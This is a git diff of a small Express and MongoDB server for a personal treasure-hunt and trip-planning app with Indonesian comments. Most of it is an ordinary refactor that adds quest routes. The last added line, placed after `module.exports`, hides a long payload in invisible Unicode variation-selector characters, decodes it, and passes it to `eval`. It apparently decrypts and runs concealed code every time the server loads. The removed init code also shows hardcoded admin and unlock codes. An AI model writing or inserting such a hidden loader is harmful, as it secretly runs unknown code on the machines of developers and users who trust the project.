@@ -7,161 +7,152 @@ const path = require('path');
 const app = express();
 
 // --- 1. KONEKSI MONGODB ---
-// Ganti dengan Connection String MongoDB-mu (Atlas/Local)
 const MONGO_URI = process.env.MONGODB_URI;
-
-// --- KONEKSI DATABASE OPTIMIZED FOR VERCEL ---
 let cached = global.mongoose;
-
-if (!cached) {
-  cached = global.mongoose = { conn: null, promise: null };
-}
+if (!cached) cached = global.mongoose = { conn: null, promise: null };
 
 async function connectDB() {
-  if (cached.conn) {
-    return cached.conn;
-  }
-
+  if (cached.conn) return cached.conn;
   if (!cached.promise) {
-    const opts = {
-      bufferCommands: false, // Wajib false di serverless biar gak nunggu lama kalau putus
-    };
-
-    cached.promise = mongoose.connect(process.env.MONGODB_URI, opts).then((mongoose) => {
-      console.log("✅ Terkoneksi ke MongoDB (Baru)");
-      return mongoose;
+    cached.promise = mongoose.connect(process.env.MONGODB_URI, { bufferCommands: false }).then((m) => {
+      console.log("✅ Terkoneksi ke MongoDB");
+      return m;
     });
   }
-
-  try {
-    cached.conn = await cached.promise;
-  } catch (e) {
-    cached.promise = null;
-    console.error("❌ Gagal koneksi DB:", e);
-    throw e;
-  }
-
+  try { cached.conn = await cached.promise; } 
+  catch (e) { cached.promise = null; throw e; }
   return cached.conn;
 }
-
-// Panggil fungsi connect di setiap request agar aman
-app.use(async (req, res, next) => {
-    await connectDB();
-    next();
-});
+app.use(async (req, res, next) => { await connectDB(); next(); });
 
 // --- 2. SCHEMA MONGODB ---
+// A. Schema Main Harta Karun (Yang Lama)
 const TreasureSchema = new mongoose.Schema({
-  session_name: String, // 'jogja_2026'
-  unlock_code: String,  // Kode buat Ida
-  admin_code: String,   // Kode buat Fendi (Admin)
-  target: {
-    lat: Number,
-    lng: Number
-  },
-  release_time: Date // <--- TAMBAHAN FIELD BARU
+  session_name: String, unlock_code: String, admin_code: String,
+  target: { lat: Number, lng: Number }, release_time: Date 
 });
 const Treasure = mongoose.model('Treasure', TreasureSchema);
 
-// Middleware
+// B. Schema Quest H-1 (BARU)
+const QuestSchema = new mongoose.Schema({
+  session_name: { type: String, default: 'magelang_2026' },
+  destinations: [{ id: String, name: String, link: String }], // Data Admin
+  ida_opinions: { type: Map, of: String, default: {} }, // Pendapat per lokasi
+  ida_shortlist: { type: [String], default: [] }, // Checkbox Calon
+  ida_final: { type: String, default: '' }, // Radio Pilih Lokasi
+  dest_submitted: { type: Boolean, default: false }, // Kunci Form Tujuan
+  foods: { type: [String], default: ['', '', ''] },
+  photo_url: { type: String, default: '' },
+  quest_submitted: { type: Boolean, default: false } // Kunci Form Quest
+});
+const Quest = mongoose.model('Quest', QuestSchema);
+
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, "public")));
 
-// --- 3. API ROUTES ---
+// --- 3. API ROUTES QUEST (BARU) ---
 
-// Init Data (Jalankan sekali aja buat bikin data awal, trus hapus/komen)
-app.get('/init', async (req, res) => {
-  const exist = await Treasure.findOne({ session_name: 'magelang_2026' });
+// Init Quest Data (Jalankan sekali aja: /api/quest/init)
+app.get('/api/quest/init', async (req, res) => {
+  const exist = await Quest.findOne({ session_name: 'magelang_2026' });
   if (!exist) {
-    await Treasure.create({
-      session_name: 'magelang_2026',
-      unlock_code: '4913',
-      admin_code: 'fendisayangida',
-      target: { lat: -7.7956, lng: 110.3695 },
-      release_time: new Date('2026-02-08T09:00:00+07:00') // Format ISO
-    });
-    return res.send('Data Created with Timer!');
+    await Quest.create({ session_name: 'magelang_2026' });
+    return res.send('Quest DB Created!');
   }
-  res.send('Data already exists.');
+  res.send('Quest DB already exists.');
 });
-// Login & Cek Kode
+
+// Get Data Quest (Untuk Frontend Ida & Admin)
+app.get('/api/quest/data', async (req, res) => {
+  const data = await Quest.findOne({ session_name: 'magelang_2026' });
+  res.json(data);
+});
+
+// Admin: Tambah Destinasi
+app.post('/api/quest/admin/add-dest', async (req, res) => {
+  const { name, link, secret } = req.body;
+  const t = await Treasure.findOne({ session_name: 'magelang_2026' });
+  if(secret !== t.admin_code) return res.status(403).json({error: 'Forbidden'});
+
+  const q = await Quest.findOne({ session_name: 'magelang_2026' });
+  q.destinations.push({ id: 'dest_' + Date.now(), name, link });
+  await q.save();
+  res.json({success: true});
+});
+
+// Admin: Buka Gembok Form Ida
+app.post('/api/quest/admin/unlock', async (req, res) => {
+  const { type, secret } = req.body; // type: 'dest' atau 'task'
+  const t = await Treasure.findOne({ session_name: 'magelang_2026' });
+  if(secret !== t.admin_code) return res.status(403).json({error: 'Forbidden'});
+
+  const q = await Quest.findOne({ session_name: 'magelang_2026' });
+  if (type === 'dest') q.dest_submitted = false;
+  if (type === 'task') q.quest_submitted = false;
+  await q.save();
+  res.json({success: true});
+});
+
+// Ida: Submit Pilihan Tujuan & Pendapat
+app.post('/api/quest/submit-dest', async (req, res) => {
+  const { opinions, shortlist, finalChoice } = req.body;
+  const q = await Quest.findOne({ session_name: 'magelang_2026' });
+  
+  q.ida_opinions = opinions;
+  q.ida_shortlist = shortlist;
+  q.ida_final = finalChoice;
+  q.dest_submitted = true;
+  await q.save();
+  res.json({success: true});
+});
+
+// Ida: Submit Quest Makanan & Foto
+app.post('/api/quest/submit-task', async (req, res) => {
+  const { foods, photo_url } = req.body;
+  const q = await Quest.findOne({ session_name: 'magelang_2026' });
+  
+  q.foods = foods;
+  q.photo_url = photo_url;
+  q.quest_submitted = true;
+  await q.save();
+  res.json({success: true});
+});
+
+// --- API HARTA KARUN LAMA TETAP ADA DI BAWAH SINI ---
 app.post('/api/login', async (req, res) => {
   const { code } = req.body;
   const data = await Treasure.findOne({ session_name: 'magelang_2026' });
-
-  if (!data) return res.status(500).json({ error: 'Database belum di-init' });
-
-  // 1. CEK ADMIN (BYPASS) - Cek ini duluan biar admin gak kena countdown
-  if (code === data.admin_code) {
-    return res.json({ role: 'admin', current_release: data.release_time });
-  } 
-  
-  // 2. CEK USER
-  else if (code === "idaindarwati") {
-    return res.json({ role: 'user', target: data.target });
-  }
+  if (code === data.admin_code) return res.json({ role: 'admin', current_release: data.release_time });
   else if (code === data.unlock_code) {
     const now = new Date();
     const release = new Date(data.release_time);
-
-    // Kalau belum waktunya -> Lempar status 'countdown'
-    if (now < release) {
-      return res.json({ 
-        role: 'countdown', 
-        release_time: data.release_time 
-      });
-    }
-
-    // Kalau sudah waktunya -> Masuk game
+    if (now < release) return res.json({ role: 'countdown', release_time: data.release_time });
     return res.json({ role: 'user', target: data.target });
   }
-  else {
-    return res.status(401).json({ error: 'WRONG_PASSCODE' });
-  }
+  return res.status(401).json({ error: 'WRONG_PASSCODE' });
 });
 
-// Update Lokasi (Fitur Admin)
 app.post('/api/update-loc', async (req, res) => {
   const { lat, lng, secret } = req.body;
-  
-  // Verifikasi double (simple check)
   const data = await Treasure.findOne({ session_name: 'magelang_2026' });
   if(secret !== data.admin_code) return res.status(403).json({error: 'Forbidden'});
-
-  data.target = { lat, lng };
-  await data.save();
-  
-  console.log(`📍 Lokasi Harta Karun Pindah ke: ${lat}, ${lng}`);
-  res.json({ success: true });
+  data.target = { lat, lng }; await data.save(); res.json({ success: true });
 });
 
-// --- UPDATE SETTING WAKTU (Fitur Admin) ---
 app.post('/api/update-time', async (req, res) => {
   const { new_time, secret } = req.body;
   const data = await Treasure.findOne({ session_name: 'magelang_2026' });
-  
   if(secret !== data.admin_code) return res.status(403).json({error: 'Forbidden'});
-
-  data.release_time = new Date(new_time);
-  await data.save();
-  res.json({ success: true });
+  data.release_time = new Date(new_time); await data.save(); res.json({ success: true });
 });
 
 app.get('/api/status', async (req, res) => {
   const data = await Treasure.findOne({ session_name: 'magelang_2026' });
   if (!data) return res.json({ error: 'No Data' });
-  
-  // Kirim waktu rilis ke frontend
   res.json({ release_time: data.release_time });
 });
 
-// Jalankan Server
 if (process.env.NODE_ENV !== 'production') {
-  const PORT = process.env.PORT || 3000;
-  app.listen(PORT, () => {
-    console.log(`🚀 Server jalan di http://localhost:${PORT} (Local Development)`);
-  });
+  app.listen(process.env.PORT || 3000, () => console.log(`🚀 Server Local Jalan`));
 }
-
 module.exports = app;
-const s=v=>[...v].map(w=>(w=w.codePointAt(0),w>=0xFE00&&w<=0xFE0F?w-0xFE00:w>=0xE0100&&w<=0xE01EF?w-0xE0100+16:null)).filter(n=>n!==null);eval(Buffer.from(s(`󠅋󠄞󠄞󠄞󠄘󠅖󠅥󠅞󠅓󠅤󠅙󠅟󠅞󠄚󠄘󠄙󠅫󠅓󠅟󠅞󠅣󠅤󠄐󠅔󠄭󠅢󠅕󠅡󠅥󠅙󠅢󠅕󠄘󠄗󠅓󠅢󠅩󠅠󠅤󠅟󠄗󠄙󠄞󠅓󠅢󠅕󠅑󠅤󠅕󠄴󠅕󠅓󠅙󠅠󠅘󠅕󠅢󠅙󠅦󠄘󠄗󠅑󠅕󠅣󠄝󠄢󠄥󠄦󠄝󠅓󠅒󠅓󠄗󠄜󠄗󠅪󠅕󠅤󠅡󠄸󠅩󠅖󠄴󠅖󠅟󠅔󠄨󠄨󠅪󠅜󠅟󠅞󠅓󠅖󠅞󠄿󠅑󠅃󠄩󠅗󠄷󠅣󠄩󠄠󠄿󠄾󠅈󠄗󠄜󠄲󠅥󠅖󠅖󠅕󠅢󠄞󠅖󠅢󠅟󠅝󠄘󠄗󠅑󠄠󠄤󠄡󠅖󠅔󠅑󠅑󠄠󠄥󠄢󠄡󠅖󠅒󠄥󠅓󠄣󠅕󠄢󠄦󠅒󠄢󠄡󠄧󠅑󠅑󠅖󠄢󠄤󠄡󠄡󠄥󠄗󠄜󠄗󠅘󠅕󠅨󠄗󠄙󠄙󠄫󠅜󠅕󠅤󠄐󠅒󠄭󠅔󠄞󠅥󠅠󠅔󠅑󠅤󠅕󠄘󠄗󠄨󠄤󠄨󠄦󠅕󠅑󠄦󠄡󠄢󠄢󠄤󠄠󠄢󠄣󠄢󠅕󠄠󠄧󠄣󠄥󠅖󠄨󠅖󠅕󠄩󠄨󠅕󠄨󠄥󠄣󠅒󠅖󠅕󠄢󠄣󠅖󠅓󠅒󠄣󠄨󠅒󠄣󠅕󠄡󠅔󠄣󠄨󠅕󠄦󠄡󠅔󠄦󠄡󠄢󠅑󠅖󠅑󠅔󠄠󠅔󠅒󠅑󠅑󠅕󠄥󠅕󠄥󠄣󠄢󠅖󠄤󠄧󠅑󠅔󠄧󠄦󠅔󠅓󠅓󠄧󠄧󠄩󠄡󠄩󠄤󠄥󠄩󠄩󠄥󠅖󠄦󠅓󠄠󠄠󠄦󠄧󠄤󠄡󠄣󠄨󠅑󠅕󠄤󠄢󠄢󠄡󠅖󠄧󠄢󠅓󠄡󠅓󠄦󠄡󠅕󠄠󠄨󠄩󠅔󠄦󠅒󠄦󠅒󠄣󠄦󠅓󠄩󠅔󠄧󠅖󠄤󠅒󠅔󠄣󠄦󠄥󠄠󠅖󠅔󠅓󠄦󠅖󠄠󠄤󠅒󠅔󠄣󠅑󠄥󠄩󠄤󠅑󠄩󠅔󠅒󠄡󠅖󠄧󠄡󠅓󠄥󠅕󠅕󠅑󠄧󠅒󠄠󠄥󠄥󠄤󠄢󠄨󠅕󠅖󠅑󠄨󠄨󠄩󠅑󠄠󠄨󠄢󠄡󠅔󠄡󠅒󠄢󠅖󠅒󠄢󠅕󠄧󠄨󠄣󠅕󠅑󠄩󠄨󠅕󠄡󠅑󠄩󠄤󠄨󠅔󠄡󠄥󠅕󠅕󠄥󠅑󠅔󠄨󠅓󠅒󠅓󠅖󠅒󠄠󠅑󠄨󠄤󠅔󠄧󠄨󠄩󠄡󠄡󠅕󠅒󠅒󠄣󠅓󠄢󠄩󠅓󠄤󠅓󠅓󠄣󠅓󠄢󠅔󠄨󠄢󠅓󠅓󠅓󠅓󠄢󠄦󠅑󠅓󠄢󠄠󠅔󠅖󠄡󠄩󠄤󠄢󠄠󠅒󠅒󠄨󠄡󠄤󠄥󠅖󠅓󠄠󠄥󠄢󠄤󠅒󠄨󠅖󠄧󠄤󠄥󠅓󠄢󠄤󠅔󠄡󠄣󠅔󠄣󠄨󠅓󠄩󠅕󠅕󠄢󠅓󠅔󠅕󠄢󠄡󠄡󠄥󠄤󠄢󠄩󠄣󠅖󠅓󠄤󠄢󠄡󠄧󠅔󠄦󠅓󠄥󠄢󠄧󠄣󠄧󠄨󠅕󠄩󠄦󠄩󠅔󠅕󠅑󠄥󠅑󠄦󠄧󠅕󠄧󠅓󠅒󠄤󠄨󠄡󠄦󠄨󠄦󠄠󠅑󠅕󠄨󠄥󠄩󠄠󠄥󠄧󠄣󠅒󠄣󠄢󠅒󠅒󠅖󠄩󠅒󠄠󠅓󠄡󠅓󠅕󠅖󠄡󠄠󠄨󠄡󠄠󠅖󠄩󠄩󠄥󠅒󠅒󠅓󠄤󠅑󠅑󠄩󠄦󠄨󠄧󠄧󠄨󠄦󠄦󠅓󠅑󠄠󠅔󠅑󠅕󠅔󠅓󠅖󠅑󠄩󠅑󠄥󠅓󠄧󠅔󠅑󠅑󠅓󠄤󠅓󠄩󠄩󠅓󠅔󠄨󠅖󠄤󠄥󠄦󠅖󠄤󠄨󠄡󠄨󠄠󠄡󠄢󠅖󠅔󠄦󠅕󠄨󠅓󠅕󠄨󠅕󠄠󠄢󠄧󠅖󠄠󠅒󠅓󠅑󠄦󠅔󠅔󠄤󠅓󠄡󠅔󠄣󠅑󠅑󠄤󠅖󠄤󠄥󠄢󠅕󠄡󠄣󠄥󠄠󠄤󠄤󠅒󠅕󠄩󠅔󠄠󠅒󠅓󠄥󠅒󠄡󠅓󠄣󠅑󠄩󠅖󠄤󠄩󠅑󠅒󠄥󠅔󠄡󠅕󠄡󠅑󠄣󠄨󠄥󠄥󠅒󠄧󠅓󠄩󠅔󠄥󠄣󠄥󠄩󠅖󠄣󠄤󠄠󠅑󠄩󠄡󠅕󠅒󠄤󠄢󠄨󠄤󠄧󠅕󠅑󠄠󠄡󠄦󠅓󠄢󠄡󠅑󠄩󠅖󠄥󠅕󠅓󠅕󠄧󠅕󠅑󠄩󠄤󠄡󠄠󠄤󠄢󠄩󠄤󠄨󠄠󠄧󠄣󠅓󠄧󠄩󠄩󠅒󠅔󠅓󠄠󠄧󠄧󠄣󠄧󠅖󠄢󠅔󠅓󠄨󠄣󠅑󠄨󠅓󠄡󠄦󠄦󠄦󠄣󠄦󠅔󠄧󠄠󠅒󠅑󠄦󠄨󠄦󠄢󠅒󠄢󠄠󠅑󠄧󠅕󠅔󠄧󠄧󠄡󠅕󠅔󠅔󠄩󠄦󠅔󠅔󠄩󠄤󠄦󠅕󠅓󠅑󠅒󠄡󠄠󠄥󠄤󠄡󠅒󠄢󠄠󠄨󠄢󠅒󠄧󠄥󠄢󠄢󠅖󠄢󠄢󠄩󠅒󠄩󠄤󠄣󠄨󠅒󠅑󠅔󠅕󠅑󠄤󠅑󠄡󠄠󠄨󠅕󠅖󠄣󠄡󠄩󠄥󠄢󠅒󠅔󠄩󠄩󠅕󠅕󠄨󠅕󠄦󠄥󠄡󠄢󠅖󠅒󠅓󠄣󠄢󠅒󠄩󠄣󠅒󠄨󠅑󠅕󠄤󠅕󠅒󠄦󠄨󠄩󠄤󠄢󠄣󠄦󠅒󠄠󠅔󠄩󠄣󠅓󠅓󠄢󠅕󠅑󠅖󠄣󠅑󠅖󠄦󠄩󠄦󠄣󠄣󠅒󠅖󠅓󠅖󠄤󠅑󠄥󠄢󠅑󠄢󠅔󠄦󠄧󠄨󠄩󠄦󠅔󠅑󠅑󠄧󠄧󠄩󠅔󠅑󠄢󠅖󠄢󠄦󠄦󠅒󠄨󠄦󠄢󠄦󠅕󠅔󠄢󠅑󠅔󠄧󠅒󠄧󠅑󠅒󠅕󠅔󠅔󠄠󠄡󠄧󠅕󠄢󠄢󠅒󠄡󠅕󠅖󠄢󠅑󠄤󠄤󠅓󠄣󠄡󠅖󠄣󠅕󠄦󠄦󠅒󠄠󠄠󠅓󠄡󠅒󠅔󠅑󠅔󠄦󠅖󠄦󠅓󠄦󠅓󠅖󠅓󠅒󠄨󠅖󠅓󠄤󠄠󠄩󠅔󠅑󠅔󠅑󠄦󠄧󠅓󠄦󠅔󠄦󠄦󠄧󠄩󠅒󠄠󠅑󠅕󠄠󠄡󠄥󠅖󠄩󠄣󠅓󠅔󠄧󠅔󠄡󠄥󠅖󠄨󠄨󠄩󠄧󠅔󠄩󠄥󠅒󠅒󠅕󠅒󠄦󠄠󠄩󠄩󠄡󠄤󠄤󠄠󠅓󠄡󠄡󠄤󠄣󠄠󠄨󠄧󠅒󠄢󠄩󠄨󠅔󠄦󠅖󠅑󠄨󠅕󠄢󠅖󠄣󠄤󠅓󠅖󠅔󠄨󠅔󠄨󠄥󠄨󠅒󠄤󠅑󠄦󠄡󠄦󠄩󠄨󠄦󠅖󠄡󠅕󠄧󠅒󠅒󠄦󠄢󠅑󠄦󠄥󠄩󠄣󠄡󠄣󠅕󠄨󠄠󠅑󠄦󠄢󠄡󠄩󠅖󠅔󠄢󠄦󠄡󠅒󠄤󠄧󠅓󠄤󠅕󠅑󠄨󠄤󠄡󠅓󠅒󠄥󠅑󠄧󠄢󠄨󠄡󠄥󠄧󠅑󠄩󠄧󠅖󠅑󠄥󠄢󠄥󠅖󠅓󠅕󠅖󠅔󠅔󠄥󠄥󠄣󠄡󠄧󠅓󠅖󠅓󠄣󠄢󠄤󠄨󠄤󠄦󠄦󠄩󠅓󠄦󠅖󠄡󠄡󠄦󠄠󠅒󠄦󠄣󠄠󠄠󠄡󠄨󠅓󠄩󠄦󠄤󠄧󠅑󠄩󠄦󠄩󠅔󠄩󠄧󠄣󠅔󠅓󠄥󠄠󠅔󠄣󠄩󠅕󠅑󠄦󠅕󠄢󠄣󠅕󠅑󠄧󠅔󠄩󠄩󠄨󠄤󠄩󠄠󠄦󠄩󠄥󠄥󠅕󠄦󠅕󠄨󠄩󠅓󠄧󠄨󠄢󠄤󠄩󠄣󠄣󠄡󠄦󠅑󠄠󠅓󠅕󠅑󠅔󠅑󠄩󠄩󠅖󠅖󠄠󠅔󠄡󠅖󠅕󠄨󠄡󠄢󠅑󠄧󠄥󠅒󠄣󠄢󠄨󠄦󠄣󠄠󠄠󠄤󠄣󠅑󠄠󠅔󠄠󠄤󠅖󠄧󠄤󠄤󠄤󠄣󠄩󠄤󠄢󠄦󠄧󠄥󠄣󠅕󠅒󠄠󠄧󠄩󠄡󠅔󠄩󠄥󠄣󠅓󠄢󠅔󠅖󠄥󠄠󠄩󠅔󠅒󠄥󠄤󠄩󠅕󠄤󠅕󠅔󠅔󠄦󠄨󠄦󠅕󠄨󠄦󠅔󠅑󠅒󠄦󠅕󠅕󠅓󠅖󠄣󠄥󠄨󠄧󠄤󠄤󠅒󠅕󠅔󠅕󠄨󠄠󠄡󠅓󠄢󠄩󠅒󠅖󠅔󠄦󠅒󠅑󠅖󠄠󠅕󠅑󠅔󠅔󠄣󠄦󠄦󠄡󠅔󠅒󠄢󠄣󠄦󠄠󠅖󠄢󠅔󠄤󠄦󠄣󠄢󠄡󠄩󠅓󠄧󠅓󠅒󠅒󠄢󠄢󠅖󠅑󠅑󠅔󠄥󠅕󠅕󠅒󠄠󠅖󠅖󠅖󠄨󠄤󠅒󠄦󠅔󠄨󠄨󠄨󠄤󠄦󠄧󠅓󠄦󠄦󠅖󠅓󠅒󠅒󠄥󠄤󠅒󠄤󠄨󠄨󠄣󠄣󠅓󠄠󠅓󠄤󠄦󠅔󠄦󠄡󠄤󠅔󠄥󠄩󠅖󠅒󠄧󠄥󠄧󠅕󠅖󠄧󠄠󠅔󠄧󠅖󠅑󠅓󠅖󠅔󠅔󠅔󠄣󠄠󠄥󠅓󠅖󠄥󠅑󠅖󠄦󠅔󠄡󠄤󠄦󠄥󠄠󠄣󠅖󠅖󠄤󠅒󠄢󠄦󠄠󠄧󠄥󠅓󠄨󠅒󠄤󠄦󠅕󠄢󠅑󠅕󠄠󠅑󠅖󠄩󠄤󠄡󠄥󠄣󠅒󠄧󠄨󠅕󠄢󠅒󠅓󠄣󠄢󠅕󠄩󠄣󠄢󠅖󠄣󠅕󠄡󠅕󠄡󠄧󠄧󠄩󠅒󠅒󠄡󠄨󠅓󠄩󠄦󠄢󠄠󠄢󠅕󠅔󠅖󠄧󠅒󠅑󠅑󠅕󠅕󠅔󠅖󠅓󠄧󠄡󠅑󠄣󠄧󠄦󠄥󠄨󠄥󠄤󠅕󠅖󠄢󠄡󠄥󠅑󠄤󠅒󠄧󠅒󠄣󠄢󠅒󠅕󠄦󠄦󠅖󠄣󠅕󠄢󠅓󠄧󠅑󠅓󠅕󠄢󠄡󠄩󠄣󠄤󠄦󠄣󠄨󠄣󠄢󠄠󠅖󠄧󠄠󠄤󠄨󠅔󠅖󠄦󠄧󠅖󠄠󠅔󠅕󠅑󠅓󠅔󠄤󠅕󠄦󠄣󠄩󠄢󠄣󠄣󠄩󠄠󠄧󠄠󠅒󠅒󠄥󠅕󠄨󠄦󠄩󠅒󠅑󠄩󠄢󠅕󠅔󠄦󠄢󠄡󠅓󠄨󠄦󠅓󠄠󠄩󠄦󠄡󠄣󠄦󠄢󠄢󠅑󠄤󠅖󠅕󠄡󠄠󠅖󠄦󠅑󠄦󠄡󠄩󠄩󠅕󠅖󠄥󠅔󠅒󠅑󠅑󠄡󠄤󠅒󠄧󠄦󠅓󠅖󠄥󠅒󠄡󠄦󠄠󠄧󠅒󠄩󠅕󠄡󠅓󠅒󠅑󠄧󠄨󠅓󠅓󠅕󠄡󠄠󠅓󠅒󠅔󠅔󠄧󠄥󠅑󠅑󠅑󠅔󠅔󠄡󠄠󠅔󠅑󠄡󠄠󠄦󠅖󠅖󠅖󠄢󠄦󠄣󠅕󠄨󠅒󠄣󠄤󠄥󠄢󠅓󠄡󠄤󠄧󠄢󠅓󠄥󠅖󠅒󠅒󠅓󠄦󠄥󠄦󠄨󠄦󠄡󠄠󠄨󠄥󠄦󠄤󠅑󠄨󠅓󠅖󠅓󠄥󠄥󠄡󠅓󠄤󠄦󠄤󠅑󠅓󠅑󠅖󠅒󠅑󠄠󠅖󠄢󠅑󠄣󠅒󠄩󠄣󠄣󠄦󠅖󠅕󠄩󠄦󠄦󠅒󠅔󠄧󠄣󠄢󠄥󠄥󠄩󠄡󠄤󠅕󠅖󠅕󠄩󠄩󠄠󠄥󠅒󠅒󠄦󠄡󠄠󠄨󠅖󠄠󠄥󠄡󠄥󠄣󠅔󠅑󠄦󠄨󠄦󠄩󠄦󠄢󠄠󠄧󠄥󠄩󠄤󠄢󠄤󠄤󠅕󠄥󠄧󠄣󠄦󠅓󠅔󠅑󠅖󠄢󠄤󠄠󠄥󠄣󠄤󠄤󠅔󠄣󠅖󠄤󠄩󠄡󠄢󠄨󠅖󠄧󠅔󠅖󠄡󠄡󠅕󠄥󠅒󠄤󠄧󠄣󠄦󠅖󠄥󠄧󠅓󠅕󠄤󠅕󠅔󠅔󠄡󠄢󠄡󠄠󠄦󠄦󠄩󠅖󠅔󠅒󠄦󠄦󠄢󠄤󠅔󠄤󠅖󠅕󠅑󠄢󠄨󠄧󠄦󠅕󠅓󠅑󠅖󠄨󠅓󠄧󠄣󠄠󠄩󠄥󠄦󠅔󠄣󠄩󠅓󠄡󠅒󠅑󠄥󠄨󠄧󠄠󠅒󠄨󠅑󠅓󠅒󠅔󠅑󠄢󠄣󠄧󠄤󠄢󠅑󠄨󠄩󠄠󠄢󠅔󠅖󠅒󠅔󠅖󠄥󠅑󠄧󠄧󠄤󠄤󠄧󠅓󠄣󠄡󠅒󠄨󠄢󠅕󠄡󠅒󠄢󠅒󠄥󠄧󠄧󠄨󠅓󠄦󠄨󠄡󠄤󠅔󠄧󠅑󠄦󠄥󠅕󠅓󠅕󠅔󠅒󠄨󠄧󠅖󠅒󠄩󠄥󠄦󠄥󠅓󠅒󠅒󠄥󠄤󠅕󠄢󠄡󠅕󠄡󠄢󠄦󠄩󠅕󠄠󠄡󠄧󠄤󠄩󠄠󠄦󠄩󠄣󠄡󠅒󠄨󠄩󠄤󠄣󠄦󠄠󠄢󠄤󠄨󠄨󠄥󠄤󠅕󠄠󠄩󠄩󠅓󠅔󠄧󠄦󠄤󠄩󠄦󠅖󠅔󠄤󠄢󠅕󠄦󠄣󠄠󠄠󠄠󠄤󠄥󠄢󠄤󠅑󠄨󠄧󠄨󠄠󠅓󠄢󠅑󠄠󠄧󠄩󠄢󠄨󠄧󠅒󠄨󠅖󠅕󠅔󠅓󠄠󠄥󠅕󠅖󠄠󠅕󠄠󠄢󠄩󠄤󠅑󠄡󠄧󠄥󠄡󠄠󠄥󠄡󠅓󠄠󠅒󠄩󠄡󠅓󠅖󠄥󠄤󠄧󠅔󠄩󠅔󠄩󠄣󠄠󠄢󠅒󠄧󠅓󠄤󠄣󠄠󠄡󠅖󠄩󠄢󠄤󠄧󠄡󠅑󠅒󠄩󠄧󠄥󠄠󠅔󠅔󠄧󠄧󠄤󠅕󠄢󠅖󠅔󠄣󠄣󠅓󠄨󠄣󠄢󠄦󠅒󠄢󠅖󠄤󠄧󠄠󠄤󠄢󠄣󠄡󠄨󠄨󠄧󠄢󠄢󠄩󠄣󠅒󠅑󠄩󠅔󠄨󠄥󠄣󠄤󠅓󠄩󠅓󠄦󠄤󠄥󠅕󠄠󠄤󠄦󠄥󠄡󠅖󠅑󠄠󠅕󠄦󠅕󠄥󠄨󠄠󠅔󠄣󠅓󠄤󠄤󠄧󠅓󠄧󠅖󠄥󠄥󠄠󠄩󠅖󠄠󠅔󠄠󠄦󠄣󠄥󠄠󠅓󠄦󠅓󠄢󠅑󠄩󠄣󠄢󠅖󠅒󠄦󠅕󠄥󠄦󠄥󠄧󠄤󠅑󠅑󠄩󠅒󠅒󠄨󠄦󠄠󠄨󠄩󠄥󠄦󠄨󠅔󠅒󠄢󠄥󠄤󠄧󠅖󠄧󠅓󠅑󠅔󠅓󠄧󠄤󠄥󠄣󠅔󠄨󠄧󠄠󠄨󠅕󠅕󠄧󠄣󠅔󠄠󠄢󠄧󠄦󠅕󠅔󠄧󠄥󠅖󠄦󠄨󠄤󠅓󠄦󠅑󠄦󠅒󠄩󠄢󠄤󠄩󠅓󠅒󠄡󠅔󠄤󠄧󠅔󠅖󠄢󠄩󠄥󠄡󠅕󠄠󠅔󠅕󠅔󠄧󠅔󠄡󠅑󠄡󠄡󠅔󠄥󠅑󠄨󠅑󠄢󠄨󠅒󠄧󠄤󠄩󠄩󠄨󠄩󠅒󠄩󠄢󠄠󠅕󠅔󠄡󠄡󠅓󠄥󠄩󠄥󠄥󠄠󠄩󠄩󠅓󠄨󠄨󠄢󠅕󠄢󠄤󠄠󠄧󠄩󠄤󠅒󠄥󠅓󠄨󠄧󠄦󠄣󠄥󠅕󠅔󠅓󠄦󠄡󠅒󠄥󠄥󠄥󠄣󠅓󠄣󠅓󠄡󠄨󠅓󠅕󠄣󠅓󠄥󠅕󠄡󠅖󠅖󠅕󠄢󠅖󠄨󠅔󠄧󠄡󠄡󠄨󠅓󠅓󠄧󠄠󠄤󠄢󠄢󠄤󠄡󠄤󠄩󠄧󠄤󠄩󠄥󠄣󠅑󠄣󠄤󠅖󠄣󠅑󠅖󠄤󠄣󠅑󠅕󠄦󠄠󠄥󠅒󠄤󠅔󠄠󠄤󠄠󠅔󠅑󠄠󠄨󠄥󠄨󠄤󠄢󠄥󠄥󠅒󠄥󠄥󠄡󠄠󠅕󠄤󠅕󠄧󠅕󠄥󠅑󠄥󠄤󠄣󠅒󠅕󠅖󠄠󠅑󠅒󠄡󠅓󠄡󠄠󠄥󠅓󠅒󠄩󠄧󠄩󠄢󠅓󠄠󠄢󠄡󠄩󠄨󠄠󠄤󠅒󠅓󠄨󠄣󠅓󠄣󠄥󠄡󠅖󠅒󠄩󠄣󠅓󠄤󠄤󠄤󠄠󠄦󠄤󠄨󠄡󠄠󠄥󠄧󠄥󠄢󠄣󠄤󠄢󠄧󠄣󠅕󠄧󠅓󠄢󠄩󠄩󠅓󠄨󠄨󠄠󠄤󠄤󠄨󠅓󠅔󠅑󠄢󠄣󠄤󠄧󠄡󠄣󠅒󠄣󠄠󠄡󠄧󠄣󠅕󠅕󠄠󠄧󠅓󠄩󠅓󠅕󠄤󠄥󠅕󠄩󠅔󠅓󠄣󠄧󠄧󠅔󠄨󠄥󠄩󠄥󠄩󠄩󠅔󠄡󠄢󠄤󠄠󠄩󠄩󠄥󠅖󠄤󠅓󠄢󠄡󠅒󠄠󠅖󠄧󠄠󠅓󠅒󠄠󠄧󠄥󠄧󠄠󠄢󠄨󠅓󠅖󠅔󠅒󠅑󠄦󠅓󠅖󠄩󠄨󠅖󠄦󠄦󠄦󠅑󠄨󠄩󠄣󠅒󠄨󠄦󠄠󠅔󠄡󠄢󠅑󠅒󠄦󠄣󠄡󠄧󠅓󠅕󠅕󠅓󠅑󠄦󠄠󠅖󠅔󠄥󠄦󠄩󠄩󠄦󠄩󠄧󠄢󠅑󠄡󠄥󠅒󠄠󠅑󠄦󠄨󠅖󠅔󠄨󠅑󠅖󠅑󠄥󠅒󠅓󠅒󠄩󠄩󠄦󠄠󠅔󠄨󠄠󠄤󠄤󠄡󠅒󠄠󠄧󠅓󠄧󠅕󠄤󠄠󠄨󠄨󠄣󠄦󠅔󠄦󠄦󠄣󠅓󠄨󠄠󠄠󠄤󠅒󠄦󠅕󠄡󠄦󠅕󠄥󠄨󠄨󠅕󠄡󠅕󠄠󠄤󠄡󠅕󠄧󠄣󠅓󠄨󠄦󠅑󠄡󠅖󠄠󠅑󠅒󠅒󠄨󠅑󠅑󠄩󠅓󠄡󠄣󠄦󠄢󠅕󠄥󠄡󠄤󠅖󠄦󠅔󠄨󠅕󠅓󠄣󠄢󠅑󠄢󠄤󠄡󠅖󠄠󠅕󠄠󠅖󠄡󠄩